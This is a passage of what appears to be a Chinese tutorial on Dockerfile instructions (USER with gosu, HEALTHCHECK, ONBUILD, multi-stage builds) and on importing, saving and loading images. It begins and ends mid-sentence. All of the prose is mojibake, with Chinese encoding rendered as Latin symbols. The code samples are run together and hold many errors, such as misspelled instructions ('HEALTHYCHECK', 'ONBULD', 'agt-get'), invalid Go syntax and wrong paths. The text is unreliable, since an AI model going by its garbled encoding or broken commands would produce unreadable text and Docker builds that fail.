¹æœ¬ä¸åŒï¼Œæ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„å®¹å™¨ï¼Œè¿™æ˜¯å¯¹Dockerfileæž„å»ºåˆ†å±‚å­˜å‚¨çš„æ¦‚å¿µä¸äº†è§£æ‰€å¯¼è‡´çš„é”™è¯¯ã€‚ å¦‚æžœéœ€è¦æ”¹å˜å„å±‚çš„å·¥ä½œç›®å½•ä½ç½®ï¼Œåº”è¯¥ä½¿ç”¨WORKDIRæŒ‡ä»¤ USERæŒ‡å®šå½“å‰ç”¨æˆ·æ ¼å¼ï¼šUSER&lt;ç”¨æˆ·å&gt; USERæŒ‡ä»¤å’ŒWORKDIRç›¸ä¼¼ï¼Œéƒ½æ˜¯æ”¹å˜çŽ¯å¢ƒå¹¶å½±å“ä»¥åŽçš„å±‚ï¼ŒWORKDIRæ˜¯æ”¹å˜å·¥ä½œç›®å½•ï¼ŒUSERåˆ™æ˜¯æ”¹å˜ä¹‹åŽå±‚çš„æ‰§è¡ŒRUN,CMDä»¥åŠENTRYPOINTè¿™ç±»å‘½ä»¤çš„èº«ä»½ å’ŒWORKDIRä¸€æ ·ï¼ŒUSERåªæ˜¯å¸®åŠ©åˆ‡æ¢åˆ°æŒ‡å®šç”¨æˆ·è€Œå·²ï¼Œè¿™ä¸ªç”¨æˆ·å¿…é¡»æ˜¯äº‹å…ˆå»ºç«‹å¥½çš„ï¼Œå¦åˆ™æ— æ³•åˆ‡æ¢ 123RUN groupadd -r redis &amp;&amp; useradd -r -g redis redisUSER redisRUN ["redis-server"] å¦‚æžœä»¥rootæ‰§è¡Œçš„è„šæœ¬ï¼Œåœ¨æ‰§è¡ŒæœŸé—´å¸Œæœ›æ”¹å˜èº«ä»½ï¼Œæ¯”å¦‚å¸Œæœ›ä»¥æŸä¸ªå·²ç»å»ºç«‹å¥½çš„ç”¨æˆ·æ¥è¿è¡ŒæŸä¸ªæœåŠ¡è¿›ç¨‹ã€‚ä¸è¦ä½¿ç”¨suæˆ–è€…sudoï¼Œè¿™äº›éƒ½éœ€è¦æ¯”è¾ƒéº»çƒ¦çš„é…ç½®ï¼Œè€Œä¸”åœ¨TTYç¼ºå¤±çš„çŽ¯å¢ƒä¸‹ç»å¸¸å‡ºé”™ï¼Œå»ºè®®ä½¿ç”¨ gosu 12345678# å»ºç«‹ redisç”¨æˆ·ï¼Œå¹¶ä½¿ç”¨ gosuæ¢å¦ä¸€ä¸ªç”¨æˆ·æ‰§è¡Œå‘½ä»¤RUN groupadd -r redis &amp;&amp; useradd -r -g redis redis# ä¸‹è½½ gosuRUN wget -O /usr/local/bin/gosu "http://github.com/tianon/gosu/release/download/1.7/gosu-amd64" \ &amp;&amp; chmod +x /usr/local/bin/gosu \ &amp;&amp; gosu nobody true# è®¾ç½®CMD,å¹¶ä»¥å¦å¤–çš„ç”¨æˆ·æ‰§è¡ŒCMD ["exec","gosu","redis","redis-server"] HEALTHCHECKå¥åº·æ£€æŸ¥æ ¼å¼ï¼š HEALTHCHECK [é€‰é¡¹] CMD &lt;å‘½ä»¤&gt;ï¼Œè®¾ç½®æ£€æŸ¥å®¹å™¨å¥åº·çŠ¶æ€çš„å‘½ä»¤ HEALTHCHECK NONEï¼šå¦‚æžœåŸºç¡€é•œåƒæœ‰å¥åº·æ£€æŸ¥æŒ‡ä»¤ï¼Œä½¿ç”¨è¿™è¡Œå¯ä»¥å±è”½å…¶å¥åº·æ£€æŸ¥æŒ‡ä»¤ã€‚ åœ¨æ²¡æœ‰HEALTHCHECKæŒ‡ä»¤å‰ï¼ŒDockerå¼•æ“Žåªå¯ä»¥é€šè¿‡å®¹å™¨å†…ä¸»è¿›ç¨‹æ˜¯å¦é€€å‡ºæ¥åˆ¤æ–­å®¹å™¨æ˜¯å¦çŠ¶æ€å¼‚å¸¸ï¼Œå¾ˆå¤šæƒ…å†µä¸‹æ²¡é—®é¢˜ï¼Œä½†æ˜¯å¦‚æžœç¨‹åºè¿›å…¥æ­»é”çŠ¶æ€ï¼Œæˆ–è€…æ­»å¾ªçŽ¯ï¼Œåº”ç”¨ç¨‹åºä¸ä¼šé€€å‡ºï¼Œä½†æ˜¯è¯¥å®¹å™¨å·²ç»æ— æ³•æä¾›æœåŠ¡äº†ã€‚åœ¨1.12å‰ï¼ŒDockerä¸ä¼šæ£€æµ‹åˆ°å®¹å™¨çš„è¿™ç§çŠ¶æ€ï¼Œä»Žè€Œä¸ä¼šé‡æ–°è°ƒåº¦ï¼Œå¯¼è‡´å¯èƒ½ä¼šæœ‰éƒ¨åˆ†å®¹å™¨å·²ç»æ— æ³•æä¾›æœåŠ¡å´è¿˜åœ¨æŽ¥å—ç”¨æˆ·è¯·æ±‚ã€‚ åœ¨1.12ä¹‹åŽï¼ŒDockeræä¾›äº†è¿™ä¸ªæŒ‡ä»¤ï¼Œé€šè¿‡æ”¹æŒ‡ä»¤æŒ‡å®šä¸€è¡Œå‘½ä»¤ï¼Œç”¨è¿™è¡Œå‘½ä»¤æ¥åˆ¤æ–­å®¹å™¨ä¸»è¿›ç¨‹æœåŠ¡çŠ¶æ€æ˜¯å¦è¿˜æ­£å¸¸ï¼Œä»Žè€Œæ¯”è¾ƒçœŸå®žçš„ååº”å®¹å™¨å®žé™…çŠ¶æ€ã€‚ å½“åœ¨ä¸€ä¸ªé•œåƒæŒ‡å®šäº†HEALTHCHECKæŒ‡ä»¤åŽï¼Œç”¨å…¶å¯åŠ¨å®¹å™¨ï¼Œåˆå§‹çŠ¶æ€ä¸ºstartingï¼Œåœ¨HEALTHCHECKæŒ‡ä»¤æ£€æŸ¥æˆåŠŸåŽå˜ä¸ºhealthyï¼Œå¦‚æžœè¿žç»­ä¸€å®šæ¬¡æ•°å¤±è´¥ï¼Œåˆ™ä¼šå˜ä¸ºunhealthy æ”¯æŒç³»åˆ—é€‰é¡¹ï¼š â€“interval=&lt;é—´éš”&gt;ï¼šä¸¤æ¬¡å¥åº·æ£€æŸ¥çš„é—´éš”ï¼Œé»˜è®¤ä¸º30s â€“timeout=&lt;æ—¶é•¿&gt;ï¼šå¥åº·æ£€æŸ¥å‘½ä»¤è¿è¡Œè¶…æ—¶æ—¶é—´ï¼Œå¦‚æžœè¶…è¿‡è¿™ä¸ªæ—¶é—´ï¼Œæœ¬æ¬¡å¥åº·æ£€æŸ¥è§†ä¸ºå¤±è´¥ï¼Œé»˜è®¤30s â€“retries=&lt;æ¬¡æ•°&gt;ï¼šå½“è¿žç»­å¤±è´¥æŒ‡å®šæ¬¡æ•°åŽï¼Œåˆ™å®¹å™¨çŠ¶æ€ä¸ºunhealthyï¼Œé»˜è®¤3æ¬¡ å’ŒCMD/ENTRYPOINTä¸€æ ·ï¼ŒHEALTHYCHECKåªå‡ºçŽ°ä¸€æ¬¡ï¼Œå¦‚æžœå†™äº†å¤šä¸ªï¼Œåªæœ‰æœ€åŽä¸€ä¸ªç”Ÿæ•ˆã€‚ åœ¨HEALTHYCHECK [é€‰é¡¹] CMDåŽé¢å‘½ä»¤ï¼Œæ ¼å¼å’ŒENTRYPOINTä¸€æ ·ï¼Œåˆ†ä¸ºshellï¼Œå’Œexecã€‚å‘½ä»¤çš„è¿”å›žå€¼å†³å®šäº†è¯¥æ¬¡å¥åº·æ£€æŸ¥çš„æˆåŠŸä¸Žå¦ï¼š0ä¸ºæˆåŠŸ1æ˜¯å¤±è´¥ï¼Œ2ä¿ç•™ï¼Œä¸è¦ä½¿ç”¨è¿™ä¸ªå€¼ å‡è®¾æˆ‘ä»¬æœ‰ä¸ªé•œåƒç®€å•çš„WebæœåŠ¡ï¼Œå¸Œæœ›å¢žåŠ å¥åº·æ£€æŸ¥åˆ¤æ–­WebæœåŠ¡æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Œç”¨curlåˆ¤æ–­ï¼Œdockerfileå¯ä»¥è¿™ä¹ˆå†™ï¼š 1234FROM nginx RUN agt-get update &amp;&amp; apt-get install -y curl &amp;&amp; rm -rf /var/lib/apt/lists/*HEALTHYCHECK --interval=5s --timeout=3s \CMD curl -fs http://localhost/ || exit 1 è®¾ç½®äº†æ¯5ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œå¦‚æžœå¥åº·æ£€æŸ¥è¶…è¿‡3ç§’æ²¡å“åº”å°±æ˜¯è§†ä¸ºå¤±è´¥ã€‚æž„å»ºå¹¶å¯åŠ¨å®¹å™¨ 123456789101112131415161718192021docker build -t myweb:v1docker run -d --name web -p 80:80 myweb:v1# æŸ¥çœ‹çŠ¶æ€docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES03e28eb00bd0 myweb:v1 "nginx -g 'daemon off" 3 seconds ago Up 2 seconds (health: starting) 80/tcp, 443/tcp web# ç­‰å¾…å‡ ç§’åŽå†æŸ¥çœ‹ï¼Œå‘çŽ°å¥åº·çŠ¶æ€å˜æˆäº†healthy,å¦‚æžœå¥åº·æ£€æŸ¥è¿žç»­å¤±è´¥è¶…è¿‡é‡è¯•æ¬¡æ•°ï¼ŒçŠ¶æ€å°±ä¸ºunhealthy# ä¸ºå¸®åŠ©æŽ’éšœï¼Œå¥åº·æ£€æŸ¥å‘½ä»¤çš„è¾“å‡ºstdout/stderrç­‰éƒ½ä¼šè¢«å­˜å‚¨åœ¨å¥åº·çŠ¶æ€ï¼Œå¯ç”¨docker inspectæŸ¥çœ‹docker inspect --formatâ€˜&#123;&#123;json .State.Health&#125;&#125;â€™ web | python -m json.tool&#123; "FailingStreak": 0, "Log": [ &#123; "End": "2016-11-25T14:35:37.940957051Z", "ExitCode": 0, "Output": "&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Welcome to nginx!&lt;/title&gt;\n&lt;style&gt;\n body &#123;\n width: 35em;\n margin: 0 auto;\n font-family: Tahoma, Verdana, Arial, sans-serif;\n &#125;\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;\n&lt;p&gt;If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.&lt;/p&gt;\n\n&lt;p&gt;For online documentation and support please refer to\n&lt;a href=\"http://nginx.org/\"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;\nCommercial support is available at\n&lt;a href=\"http://nginx.com/\"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;\n\n&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n", "Start": "2016-11-25T14:35:37.780192565Z" &#125; ], "Status": "healthy"&#125; ONBUILDä¸ºä»–äººåšå«è¡£è£³æ ¼å¼ï¼šONBUILD&lt;å…¶ä»–æŒ‡ä»¤&gt; ONBUILDæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æŒ‡ä»¤ï¼ŒåŽé¢è·Ÿç€çš„æ˜¯å…¶ä»–æŒ‡ä»¤ï¼Œä¾‹å¦‚RUN/COPYç­‰ï¼Œè€Œè¿™äº›æŒ‡ä»¤ï¼Œåœ¨å½“å‰é•œåƒæž„å»ºæ—¶ä¸ä¼šè¢«æ‰§è¡Œï¼Œåªæœ‰å½“ä»¥å½“å‰é•œåƒä¸ºåŸºç¡€ï¼ŒåŽ»æž„å»ºä¸‹ä¸€ä¸ªé•œåƒæ‰ä¼šæ‰§è¡Œ Dockerfileä¸­çš„å…¶ä»–æŒ‡ä»¤éƒ½æ˜¯ä¸ºäº†å®šåˆ¶å½“å‰é•œåƒè€Œå‡†å¤‡çš„ï¼ŒONBUILDæ˜¯ä¸ºäº†å¸®åŠ©åˆ«äººå®šåˆ¶è‡ªå·±å‡†å¤‡çš„ã€‚Nodejsä½¿ç”¨npmç®¡ç†ï¼Œæ‹¿åˆ°ç¨‹åºåŽï¼Œä¸€èˆ¬ä¼šå…ˆå®‰è£…ä¾èµ–ï¼Œç„¶åŽå¯åŠ¨ï¼Œä¸€èˆ¬ä¼šè¿™ä¹ˆå†™Dockerfile 1234567FROM node:slimRUN mkdir /appWORKDIR /appCOPY ./package.json /appRUN ["npm","install"]COPY . /app/CMD ["npm","start"] æŠŠè¿™ä¸ªDockerfileæ”¾åˆ°Nodejsçš„æ ¹ç›®å½•ï¼Œæž„å»ºå¥½é•œåƒåŽï¼Œå°±å¯ä»¥ç›´æŽ¥æ‹¿æ¥å¯åŠ¨å®¹å™¨è¿è¡Œï¼Œä½†æ˜¯å¦‚æžœæœ‰ç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªå·®ä¸å¤šçš„é¡¹ç›®ï¼Œéšç€æ–‡ä»¶é™„ä»¶è¶Šå¤šï¼Œç‰ˆæœ¬æŽ§åˆ¶å°±è¶Šéš¾ã€‚ å¦‚æžœåœ¨ç¬¬ä¸€ä¸ªNodejsé¡¹ç›®å‘çŽ°äº†Dockerfileå­˜åœ¨çš„é—®é¢˜ï¼Œæ¯”å¦‚æ•²é”™å­—ï¼Œæˆ–è€…éœ€è¦å®‰è£…é¢å¤–çš„åŒ…ï¼Œç„¶åŽå¼€å‘äººå‘˜ä¿®å¤äº†è¿™ä¸ªDockerï¼Œå†æ¬¡æž„å»ºï¼Œé—®é¢˜è§£å†³ã€‚ä½†æ˜¯å…¶ä»–é¡¹ç›®å‘¢ï¼Ÿè™½ç„¶æœ€åˆDockerfileæ˜¯å¤åˆ¶ã€ç²˜è´´è‡ªç¬¬ä¸€ä¸ªé¡¹ç›®ï¼Œä½†æ˜¯å¹¶ä¸ä¼šå› ä¸ºç¬¬ä¸€ä¸ªé¡¹ç›®ä¿®å¤äº†Dockerfileå°±ä¼šè‡ªåŠ¨ä¿®å¤ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªåŸºç¡€é•œåƒï¼Œç„¶åŽå„ä¸ªé¡¹ç›®ä½¿ç”¨è¿™ä¸ªåŸºç¡€é•œåƒã€‚é•œåƒæ›´æ–°åŽå°±ä¸ç”¨åŒæ­¥Dockerfileçš„å˜åŒ–ï¼Œé‡æ–°æž„å»ºåŽå°±ç»§ç»­äº†åŸºç¡€é•œåƒçš„æ›´æ–°ï¼š 1234FROM node:slimRUN mkdir /appWORKDIR /appCMD ["npm","start"] è¿™é‡ŒæŠŠé¡¹ç›®ç›¸å…³çš„æž„å»ºæŒ‡ä»¤æ‹¿å‡ºæ¥ï¼Œæ”¾åœ¨å­é¡¹ç›®åŽ»ã€‚å‡è®¾è¿™ä¸ªåŸºç¡€é•œåƒä¸ºmy-nodeï¼Œå„ä¸ªé¡¹ç›®å†…çš„Dockerfileå°±å˜æˆï¼š 1234FROM my-nodeCOPY ./package.json /appRUN ["npm","install"]COPY . /app/ åŸºç¡€é•œåƒå˜åŒ–åŽï¼Œå„ä¸ªé¡¹ç›®éƒ½ç”¨è¿™ä¸ªDockerfileé‡æ–°æž„å»ºé•œåƒï¼Œä¼šåŸºç¡€åŸºç¡€é•œåƒçš„æ›´æ–°ã€‚ ä½†æ˜¯é—®é¢˜å¹¶æ²¡æœ‰å®Œå…¨è§£å†³ï¼Œè¿™ä¸ªDockerfileå¦‚æžœæœ‰ä¸œè¥¿è¦ä¿®æ”¹ï¼Œåˆè¦é‡æ–°ä¸€ä¸ªä¸€ä¸ªä¿®æ”¹ã€‚è¿™æ ·åˆ¶ä½œé•œåƒåªè§£å†³äº†åŽŸæ¥Dockerfileçš„å‰4æ¡æŒ‡ä»¤çš„å˜åŒ–é—®é¢˜ï¼Œè€ŒåŽé¢ä¸‰æ¡æŒ‡ä»¤çš„å˜åŒ–åˆ™å®Œå…¨æ²¡åŠžæ³•å¤„ç† ONBUILDå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š 1234567FROM node:slimRUN mkdir /appWORKDIR /appONBUILD COPY ./package.json /appONBUILD RUN ["npm","install"]ONBULD COPY . /app/CMD ["npm","start"] åœ¨æž„å»ºé•œåƒçš„æ—¶å€™ï¼Œè¿™ä¸‰è¡Œå¹¶ä¸ä¼šè¢«æ‰§è¡Œï¼Œç„¶åŽå„ä¸ªé¡¹ç›®çš„Dockerfileå°±å˜æˆ 1FROM my-node å½“åœ¨å„ä¸ªé¡¹ç›®ç›®å½•ä¸­ï¼Œç”¨è¿™ä¸ªåªæœ‰ä¸€è¡Œçš„Dockerfileæž„å»ºé•œåƒæ—¶ï¼Œä¹‹å‰åŸºç¡€é•œåƒçš„é‚£ä¸‰è¡ŒONBUILDå°±ä¼šæ‰§è¡Œï¼ŒæˆåŠŸçš„å°†å½“å‰é¡¹ç›®çš„ä»£ç å¤åˆ¶è¿›é•œåƒï¼Œå¹¶ä¸”é’ˆå¯¹æœ¬é¡¹ç›®è¿›è¡Œnpm installï¼Œç”Ÿæˆå¯¹åº”é•œåƒ å¤šé˜¶æ®µæž„å»ºåœ¨17.05ä¹‹å‰ï¼Œæž„å»ºDockeré•œåƒé€šå¸¸ä¼šé‡‡ç”¨ä¸¤ç§æ–¹å¼ å…¨éƒ¨æ”¾å…¥ä¸€ä¸ªDockerfileä¸€ç§æ–¹å¼æ˜¯å°†æ‰€æœ‰çš„æž„å»ºè¿‡ç¨‹ç¼–åŒ…å«åœ¨ä¸€ä¸ªDockerfileä¸­ï¼ŒåŒ…æ‹¬é¡¹ç›®ä»¥åŠä¾èµ–åº“çš„ç¼–è¯‘ã€æµ‹è¯•ã€æ‰“åŒ…ç­‰æµç¨‹ï¼Œè¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€äº›é—®é¢˜ï¼š Dockerfileç‰¹åˆ«é•¿ï¼Œå¯ç»´æŠ¤æ€§é™ä½Ž é•œåƒå±‚æ¬¡å¤šï¼Œé•œåƒä½“ç§¯è¾ƒå¤§ï¼Œéƒ¨ç½²æ—¶é—´å˜é•¿ æºä»£ç å­˜åœ¨æ³„æ¼çš„é—®é¢˜ ä¾‹å¦‚ï¼šç¼–å†™app.goæ–‡ä»¶ï¼Œè¾“å‡ºHello World! 12345package mainimport "fmt"function main()&#123; fmt.Printf('Hello World!')&#125; ç¼–å†™Dockerfile.oneæ–‡ä»¶ 12345678910FROM golang:1.9-alpineRUN apk --no-cache add got ca-certificatesWORKDIR /go/src/github.com/go/helloworld/COPY app.go .RUN go get -d -v github.com/go-sql-driver/mysql \ &amp;&amp; CGO_ENABLED=0 GOOS=linux go buld -a -installsuffix cgo -o app . \ &amp;&amp; cp /go/src/github.com/go/helloworld/app/rootWORKDIR /root/CMD ["./app"] æž„å»ºé•œåƒ 1docker build -t go/helloworld:1 -f Dockerfile.one åˆ†å‰²åˆ°å¤šä¸ªDockerfileå¦ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯äº‹å…ˆåœ¨ä¸€ä¸ªDockerfileå°†é¡¹ç›®ä»¥åŠå…¶ä¾èµ–åº“ç¼–è¯‘æµ‹è¯•æ‰“åŒ…å¥½åŽï¼Œå†å°†å…¶æ‹·è´åˆ°è¿è¡ŒçŽ¯å¢ƒä¸­ï¼Œè¿™ç§æ–¹å¼éœ€è¦ç¼–å†™ä¸¤ä¸ªDockerfileå’Œä¸€äº›ç¼–è¯‘è„šæœ¬æ‰èƒ½å°†ä¸¤ä¸ªé˜¶æ®µè‡ªåŠ¨æ•´åˆèµ·æ¥ï¼Œè¿™ç§æ–¹å¼è™½ç„¶å¯ä»¥å¾ˆå¥½è§„é¿ç¬¬ä¸€ç§æ–¹å¼å­˜åœ¨çš„é£Žé™©ï¼Œä½†æ˜Žæ˜¾éƒ¨ç½²è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ Dockerfile.buildæ–‡ä»¶ 123456FROM golang:1.9-alpineRUN apk --no-cache add gitWORKDIR /go/src/github.com/go/helloworldCOPY app.go .RUN go get -d -v github.com/go-sql-driver/mysql \ &amp;&amp; CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app . Dockerfile.copyæ–‡ä»¶ 12345FROM alpine:latestRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY app .CMD ["./app"] æ–°å»ºbuild.sh 12345678910111213#!/bin/shecho Building go/helloworld:builddocker build -t go/helloworld:build . -f Dockerfile.builddocker create --name extract go/helloworld:builddocker cp extrace:go/src/github.com/go/helloworld/app ./appdocker rm -f extractecho Building go/helloworld:2docker build --no-cache -t go/helloworld:2 -f Dockerfile.copy rm ./app è¿è¡Œè„šæœ¬å³å¯æž„å»ºé•œåƒ 12chmod +x build.sh./build.sh å¯¹æ¯”ä¸¤ç§ç”Ÿæˆçš„é•œåƒå¤§å° 12345$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEgo/helloworld 2 f7cf3465432c 22 seconds ago 6.47MBgo/helloworld 1 f55d3e16affc 2 minutes ago 295MB ä½¿ç”¨å¤šé˜¶æ®µæž„å»ºä¸ºäº†è§£å†³ä»¥ä¸Šçš„é—®é¢˜ï¼Œ17.05åŽå¼€å§‹æ”¯æŒå¤šé˜¶æ®µæž„å»ºï¼ˆmultistage buildsï¼‰,ä½¿ç”¨å¤šé˜¶æ®µæž„å»ºå¯ä»¥è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼Œå¹¶åªéœ€è¦ç¼–å†™ä¸€ä¸ªDockerfileï¼š ä¾‹å¦‚ï¼š ç¼–å†™Dockerfileæ–‡ä»¶ï¼š 1234567891011FROM golang:1.9-alpine as builderRUN apk --no-cache add gitWORKDIR /go/src/github.com/go/helloworld/RUN go get -d -v github.com/go-sql-driver/mysqlCOPY app.go .RUN CGO_ENABLED=0 GOOS=linux go build -a installsuffix cgo -o appFROM alpine:latest as prodRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY --from=0 /go/src/github.com/go/helloworld/app .CMD ["./APP"] æž„å»ºé•œåƒ 1docker build -t go/helloworld:3 . å¯¹æ¯”ä¸‰ä¸ªé•œåƒ 123456$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEgo/helloworld 3 d6911ed9c846 7 seconds ago 6.47MBgo/helloworld 2 f7cf3465432c 22 seconds ago 6.47MBgo/helloworld 1 f55d3e16affc 2 minutes ago 295MB å¾ˆæ˜Žæ˜¾ä½¿ç”¨å¤šé˜¶æ®µæž„å»ºçš„é•œåƒä½“ç§¯å°ï¼ŒåŒæ—¶ä¹Ÿè§£å†³äº†ä¸Šè¾¹çš„é—®é¢˜ åªæž„å»ºä¸€é˜¶æ®µçš„é•œåƒä½¿ç”¨asä¸ºæŸä¸€é˜¶æ®µå‘½ä»¤ï¼Œä¾‹å¦‚ï¼š 1FROM golang:1.9-alpine as builder åªæž„å»ºbuilderé˜¶æ®µçš„é•œåƒï¼Œå¯ä»¥åœ¨ä½¿ç”¨ docker buildçš„æ—¶å€™åŠ ä¸Š--target 1docker build --target builder -t username/imagename:tag . æž„å»ºæ—¶ä»Žå…¶ä»–é•œåƒå¤åˆ¶æ–‡ä»¶ä¸Šé¢çš„ä¾‹å­ä½¿ç”¨ COPY --from=0 /go/src/github.com/go/helloworld/app .ä»Žä¸Šä¸€é˜¶æ®µçš„é•œåƒä¸­å¤åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ä»»æ„é•œåƒä¸­çš„æ–‡ä»¶ 1COPY --from=nginx:latest /ect/nginx/nginx.conf /nginx.conf å…¶ä»–åˆ¶ä½œé•œåƒçš„æ–¹å¼ä»ŽrootfsåŽ‹ç¼©åŒ…å¯¼å…¥æ ¼å¼ï¼šdocker import [é€‰é¡¹] &lt;æ–‡ä»¶&gt;|&lt;URL&gt;|- [&lt;ä»“åº“å&gt;[:&lt;æ ‡ç­¾&gt;]] åŽ‹ç¼©åŒ…å¯ä»¥æ˜¯æœ¬åœ°æ–‡ä»¶ï¼Œè¿œç¨‹Webæ–‡ä»¶ï¼Œç”šè‡³æ˜¯ä»Žæ ‡å‡†è¾“å…¥ä¸­å¾—å‡ºçš„ï¼ŒåŽ‹ç¼©åŒ…å°±ä¼šåœ¨é•œåƒ /ç›®å½•å±•å¼€ï¼Œå¹¶ç›´æŽ¥ä½œä¸ºé•œåƒç¬¬ä¸€å±‚æäº¤ 123456# åˆ›å»ºä¸€ä¸ªOpenVZçš„Ubuntu14.04æ¨¡æ¿çš„é•œåƒï¼šdocker import \ http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gz \ openvz/ubuntu:14.04Downloading from http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gzsha256:f477a6e18e989839d25223f301ef738b69621c4877600ae6467c4e5289822a79B/78.42 MB è¿™æ¡å‘½ä»¤è‡ªåŠ¨ä¸‹è½½äº† ubuntu-14.04-x86_64-minimal.tar.gz æ–‡ä»¶ï¼Œå¹¶ä¸”ä½œä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿå±•å¼€å¯¼å…¥ï¼Œå¹¶ä¿å­˜ä¸ºé•œåƒ openvz/ubuntu:14.04 å¯¼å…¥æˆåŠŸåŽï¼Œä½¿ç”¨ docker image lså¯ä»¥çœ‹åˆ°è¿™ä¸ªå¯¼å…¥çš„é•œåƒ çœ‹åˆ°åŽ†å²ä¼šçœ‹åˆ°æè¿°ä¸­æœ‰å¯¼å…¥çš„æ–‡ä»¶é“¾æŽ¥ 123$ docker history openvz/ubuntu:14.04IMAGE CREATED CREATED BY SIZE COMMENTf477a6e18e98 About a minute ago 214.9 MB Imported from http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gz docker saveå’Œdocker loadå°†é•œåƒä¿å­˜ä¸ºä¸€ä¸ªtaræ–‡ä»¶ï¼Œç„¶åŽä¼ è¾“åˆ°å¦å¤–ä¸€ä¸ªä½ç½®ï¼Œå†åŠ è½½è¿›æ¥ã€‚è¿™æ˜¯åœ¨æ²¡æœ‰Docker Registryçš„åšæ³•ï¼ŒçŽ°åœ¨å·²ä¸æŽ¨èã€‚é•œåƒè¿ç§»ç›´æŽ¥ä½¿ç”¨Docker Registryï¼Œæ— è®ºæ˜¯ç›´æŽ¥ä½¿ç”¨Docker Hubè¿˜æ˜¯ä½¿ç”¨å†…ç½‘ç§æœ‰Registryéƒ½å¯ä»¥ ä¿å­˜é•œåƒ docker saveå°†é•œåƒä¿å­˜ä¸ºå½’æ¡£æ–‡ä»¶ 1docker save alpine | gzip &gt; alpine-latest.tar.gz ç„¶åŽå°†å®ƒå¤åˆ¶åˆ°å¦å¤–ä¸€ä¸ªæœºå™¨ä¸Šï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤åŠ è½½é•œåƒï¼š 12docker load -i alpine-latest.tar.gzLoaded image: alpine:latest ç»“åˆè¿™ä¸¤ä¸ªå‘½ä»¤å’Œsshç”šè‡³æ˜¯pvï¼Œåˆ©ç”¨Linuxç®¡é“å¯ä»¥å†™ä¸€ä¸ªå‘½ä»¤å®Œæˆä»Žä¸€ä¸ªæœºå™¨å°†é•œåƒè¿ç§»åˆ°å¦å¤–ä¸€ä¸ªæœºå™¨ï¼Œå¹¶ä¸”å¸¦è¿›åº¦æ¡çš„åŠŸèƒ½ï¼š 1docker save &lt;é•œåƒå&gt; | bzip2 | pv |ssh &lt;ç”¨æˆ·å&gt;@&lt;ä¸»æœºå&gt; 'cat|docker load' é•œåƒå®žçŽ°çš„åŽŸç†Dockeré•œåƒæ˜¯æ€Žä¹ˆå®žçŽ°å¢žé‡çš„ä¿®æ”¹å’Œç»´æŠ¤çš„ï¼Ÿ æ¯ä¸ªé•œåƒéƒ½ç”±å¤šå±‚æ¬¡æž„æˆï¼ŒDockerä½¿ç”¨Union FSå°†è¿™äº›ä¸åŒå±‚ç»“åˆåˆ°ä¸€ä¸ªé•œåƒä¸­åŽ»ã€‚ é€šå¸¸Union FSæœ‰ä¸¤ä¸ªç”¨é€”ï¼Œä¸€æ–¹é¢å¯ä»¥å®žçŽ°ä¸å€ŸåŠ©LVM,RAIDå°†å¤šä¸ªdiskæŒ‚åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œå¦ä¸€ä¸ªæ›´å¸¸ç”¨çš„å°±æ˜¯è®²ä¸€ä¸ªåªè¯»çš„åˆ†æ”¯å’Œä¸€ä¸ªå¯å†™çš„åˆ†æ”¯è”åˆåœ¨ä¸€èµ·ã€‚ æ“ä½œå®¹å™¨ç®€å•æ¥è¯´ï¼Œå®¹å™¨ä¼¼ä¹Žè¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨ï¼Œä»¥åŠå®ƒä»¬çš„è¿è¡Œæ€çŽ¯å¢ƒï¼Œè™šæ‹Ÿæœºå¯ä»¥ç†è§£ä¸ºæ¨¡æ‹Ÿè¿è¡Œçš„ä¸€æ•´å¥—æ“ä½œç³»ç»Ÿï¼ˆæä¾›äº†è¿è¡Œæ€çŽ¯å¢ƒå’Œå…¶ä»–ç³»ç»ŸçŽ¯å¢ƒï¼‰å’Œè·‘åœ¨ä¸Šé¢çš„åº”ç”¨ å¯åŠ¨å®¹å™¨å¯åŠ¨å®¹å™¨æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºŽé•œåƒæ–°å»ºä¸€ä¸ªå®¹å™¨å¹¶å¯åŠ¨ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å°†åœ¨ç»ˆæ­¢çŠ¶æ€ï¼ˆstoppedï¼‰çš„å®¹å™¨é‡æ–°å¯åŠ¨ã€‚å› ä¸ºDockerçš„å®¹å™¨å¾ˆè½»çº§ï¼Œç”¨æˆ·å¯ä»¥éšæ—¶åˆ é™¤å’Œæ–°å»ºå®¹å™¨ã€‚ æ–°å»ºå¹¶å¯åŠ¨12345# è¾“å‡ºHello WorldåŽç»ˆæ­¢å®¹å™¨docker run ubuntu:14.04 /bin/echo 'Hello world'# 